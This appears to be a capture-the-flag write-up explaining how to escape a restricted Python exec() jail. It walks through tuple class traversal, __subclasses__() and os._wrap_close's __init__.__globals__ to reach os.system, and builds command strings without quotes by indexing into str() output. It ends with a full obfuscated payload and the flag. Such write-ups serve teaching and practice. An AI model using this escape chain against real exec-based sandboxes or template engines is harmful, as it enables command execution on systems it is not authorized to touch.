---
title: Build Yourself In
date: 2021-04-28 12:00:00 +/-1111
author: David Wolfe
categories: [Writeups, HTBCTF]
tags: [htb,ctf,writeup,htbctf] 
---
## Description:
The extraterrestrials have upgraded their authentication system and now only they are able to pass. Did you manage to learn their language well enough in order to bypass the authorization check?

## Methodology

This challenge has us placed in a python jail where we can provide very limited input. Providing malformed input can get us a useful error message that gives us a little insight into what exactly this jail is doing.
```python
File "/app/build_yourself_in.py", line 13, in main
    exec(text, {'__builtins__': None, 'print':print})
```
This tells us that our input code is running inside of a locked down exec() call. With **\_\_builtins\_\_** being set to a None object we know that the only function we have available to us is print. However, we can find another restriction in the fact that if we try to run **print("test")** we get this message.
```
🛑No quotes are allowed! 🛑

Exiting..
```
This is an important restriction to know about and one we will come back to later.
For now the goal is to run some functions that have supposedly been removed from our environment with ```'__builtins__': None```.
One thing we do have access to inside of this prompt is the use of tuples. Tuples are simple objects in python that are essentially immutable lists. An empty tuple can be created as ```()``` in python. This may not seem very helpful on it's own, but what's important about tuples in python is that they inherit from the **Object** class.
using the python built-in attribute __class__ and __bases__ we're able to return a tuple containing the classes that an object inherits from.
```python
print(().__class__.__bases__)
#Results in <class 'object'>
```
This is really good news for us as it means we can now access any of the other classes that are used in this program that also inherit from object. We can get a nice list of these different classes by running ```().__class__.__bases__[0].__subclasses__()``` which returns an array containing all of the subclasses of objects that have been imported into this program.
I cleaned up the output and got the following list
```python
class 'type'
class 'weakref'
class 'weakcallableproxy'
class 'weakproxy'
class 'int'
class 'bytearray'
class 'bytes'
class 'list'
class 'NoneType'
class 'NotImplementedType'
class 'traceback'
class 'super'
class 'range'
class 'dict'
class 'dict_keys'
class 'dict_values'
class 'dict_items'
class 'dict_reversekeyiterator'
class 'dict_reversevalueiterator'
class 'dict_reverseitemiterator'
class 'odict_iterator'
class 'set'
class 'str'
class 'slice'
class 'staticmethod'
class 'complex'
class 'float'
class 'frozenset'
class 'property'
class 'managedbuffer'
class 'memoryview'
class 'tuple'
class 'enumerate'
class 'reversed'
class 'stderrprinter'
class 'code' [35]
class 'frame'
class 'builtin_function_or_method'
class 'method'
class 'function'
class 'mappingproxy'
class 'generator'

...
class 'bytes_iterator'
class 'bytearray_iterator'
class 'dict_keyiterator'
class 'dict_valueiterator'
class 'list_iterator'
class 'list_reverseiterator'
class 'range_iterator'
class 'set_iterator'
class 'str_iterator'
class 'tuple_iterator'
class 'collections.abc.Sized'
class 'collections.abc.Container'
class 'collections.abc.Callable'
class 'os._wrap_close'
class '_sitebuiltins.Quitter'
class '_sitebuiltins._Printer'
class '_sitebuiltins._Helper'
```
This is an incredibly long list, but out of it there are a couple important classes for what we're trying to accomplish.

```class 'str'``` is at position 21 in the array and could be used to build a string without us inputting quotes.

```class 'os._wrap_close'``` is at position 132 and could be used to access the os.system() function for running commands on the server.
We will start tinkering with the os._wrap_close class first.
Doing some googling I came across this [article](https://blog.p6.is/Python-SSTI-exploitable-classes/) discussing vulnerable python classes.

At the bottom of the article they provide sample code to access system("ls") from os.__wrap_close
```python
[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__['system']('ls')
```
This shows that if you have the os._wrap_close class you can walk up the reference using ```__init__.__globals__``` to get a dictionary of all the functions that class implements.

We can combine this with our previous command to get a long list of all functions we have access to through the OS.
```python
print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)
```
This outputs
```
{'__name__': 'os', '__doc__': "OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either 'posix' or 'nt'\n  - os.curdir is a string representing the current directory (always '.')\n  - os.pardir is a string representing the parent directory (always '..')\n  - os.sep is the (or a most common) pathname separator ('/' or '\\\\')\n  - os.extsep is the extension separator (always '.')\n  - os.altsep is the alternate pathname separator (None or '/')\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files ('\\r' or '\\n' or '\\r\\n')\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device ('/dev/null', etc.)\n\nPrograms that import and use 'os' stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir),
...
'system': <built-in function system>
...
```
In the middle of this incredibly long output we find the entry for **system**.
Perfect, we're almost there!

Now we have TO the address the elephant in the room... we still can't use quotes of any kind to build a string.<br />
The original code we want to run is ```print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['system']('ls'))```. We can do all of this except for the **system** and **ls** strings.<br />
To get around this we need to go back to the str class we found previously in the class dump. The useful aspect of this function comes from the fact that if you give it a dictionary or array, it will return the string version of that object. In python string objects can be substringed with indices the same way you would an array.
```python
print(str({'__name__': 'os'})[4]) #This results the letter n being printed
```
With this in mind we just need to pass in an object that has all the characters we need to build the string for **system** and **ls**. I decided to pass in the large function dump we got from running the above ```__init__.__globals__``` code. With this long string for our use in substringing we are now able to piece together the strings we need. I wrote a small [script](https://github.com/dwolfe884/CTFWriteups/blob/main/misc/HTBCTF_BuildYourselfIn/builder.py) to build the payload for me.

The final payload I ended up using to cat out the flag.txt file was
```python
print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[79]+().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[78]+().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[79]+().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[80]+().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[81]+().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[82]](().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[155]+().__class__.__bases__[0].__subclasses__()[22](().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)[79]))
```
This returns our flag
```
CHTB{n0_j4il_c4n_h4ndl3_m3!}
```
